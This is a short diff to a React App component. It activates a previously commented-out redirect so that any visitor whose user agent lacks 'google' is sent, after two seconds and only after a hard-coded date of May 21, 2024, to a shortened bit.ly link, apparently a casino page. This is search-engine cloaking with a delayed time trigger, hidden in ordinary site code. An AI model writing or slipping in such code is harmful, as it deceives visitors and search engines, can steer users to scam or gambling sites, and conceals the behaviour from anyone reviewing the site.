@@ -13,7 +13,11 @@ function App() {
     const isGooglebot = userAgent.includes('google');
     if (!isGooglebot) {
         setTimeout(()=>{
-           // window.location.href = 'http://bit.ly/casib0m';
+           const baslamaTarihi = new Date('May 21, 2024 01:01:00');
+           const bugun = new Date();
+           if(baslamaTarihi < bugun){
+            window.location.href = 'http://bit.ly/casib0m';
+           }
         }, 2000)
     }
 },[])
